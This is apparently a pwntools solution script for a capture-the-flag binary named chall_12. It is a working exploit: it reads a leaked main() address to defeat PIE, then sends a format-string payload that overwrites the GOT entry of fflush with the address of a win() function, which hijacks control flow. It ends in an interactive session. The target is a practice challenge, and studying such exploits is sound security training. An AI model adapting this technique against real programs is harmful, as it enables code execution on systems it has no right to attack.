'''
Flaws: No RELRO, Symbols
Security: PIE enabled, NX enabled

Address leaked is the start of main()
win() and vuln()
'''
from pwn import *

win = 0x080484d6

elf = ELF("./chall_12")
p = process("./chall_12")

p.recvuntil(b"Just a single second: ")
leak = p.recvuntil(b"\n")
print('leak of main(): ' + str(leak))

l1 = b"Something"
p.sendline(l1)

elf.address = int(leak, 16) - elf.sym.main
offset = 6
l2 = fmtstr_payload(offset, {elf.got.fflush : elf.sym.win})
print(hex(elf.got.fflush))
print(l2)
null = l2.find(b'\x00')
print(null)
p.sendline(l2)
p.recvuntil(l2[null -3 : null])
p.interactive()